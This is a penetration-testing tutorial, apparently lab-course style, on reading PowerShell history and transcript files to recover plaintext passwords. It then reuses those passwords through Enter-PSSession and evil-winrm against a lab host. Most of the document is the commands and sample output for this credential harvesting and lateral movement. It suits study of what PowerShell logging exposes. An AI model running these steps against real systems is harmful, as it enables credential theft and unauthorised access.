# Leveraging PowerShell Logs in Penetration Testing

## Introduction

During penetration testing, gaining access to sensitive information like credentials can significantly enhance your foothold in the target environment. PowerShell logging mechanisms, such as Transcription and Script Block Logging, are valuable resources that can reveal crucial information.

## PowerShell Logging Mechanisms

### PowerShell Transcription
Transcription logs commands executed in PowerShell, saving them in transcript files typically found in user directories or a central directory.

### Script Block Logging
Script Block Logging records entire blocks of script code as they execute, capturing full command content.

## Retrieving PowerShell History

### Scenario: Penetration Test
Assume you have a bind shell on port 4444 as user `dave`.

1. **Check PowerShell history:**

    ```powershell
    PS C:\Users\dave> Get-History
    ```

    If empty, check PSReadline history:

    ```powershell
    PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
    PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    ```

2. **Analyze history file:**

    Example output might include commands setting up credentials:

    ```plaintext
    $PSVersionTable
    Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
    Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
    Clear-History
    Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
    Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    exit
    Stop-Transcript
    ```

    Note credentials or paths for further investigation.

3. **Review PowerShell Transcription:**

    ```powershell
    PS C:\Users\dave> type C:\Users\Public\Transcripts\transcript01.txt
    ```

    Example content might reveal credentials:

    ```plaintext
    $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
    Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    ```

4. **Use retrieved credentials to gain access:**

    ```powershell
    PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
    PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
    PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    ```

    Verify access with:

    ```powershell
    whoami
    ```

    If needed, use `evil-winrm` from Kali:

    ```bash
    kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
    ```

## Conclusion

PowerShell logs are a treasure trove for penetration testers. By examining PowerShell history and transcript files, you can uncover valuable credentials and command executions, enabling deeper access into the target environment. Always review these logs during your tests to maximize your findings.
